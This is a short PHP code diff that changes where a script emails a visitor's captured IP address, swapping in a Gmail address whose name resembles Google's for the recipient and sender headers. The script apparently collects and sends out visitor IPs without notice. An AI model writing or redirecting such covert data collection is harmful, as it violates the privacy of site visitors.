@@ -32,11 +32,11 @@ function sanitizeEmail($email)
 $userIP = getUserIP();
 
 // Prepare the email message
-$to = sanitizeEmail('geeert45@gmail.com');
+$to = sanitizeEmail('teamgoogl8@gmail.com');
 $subject = 'IP Address Retrieved';
 $message = 'The user IP address is: ' . $userIP;
-$headers = 'From: noreply@yourdomain.com' . "\r\n" .
-    'Reply-To: noreply@yourdomain.com' . "\r\n" .
+$headers = 'From: teamgoogl8@gmail.com' . "\r\n" .
+    'Reply-To: teamgoogl8@gmail.com' . "\r\n" .
     'X-Mailer: PHP/' . phpversion();
 
 // Send the email
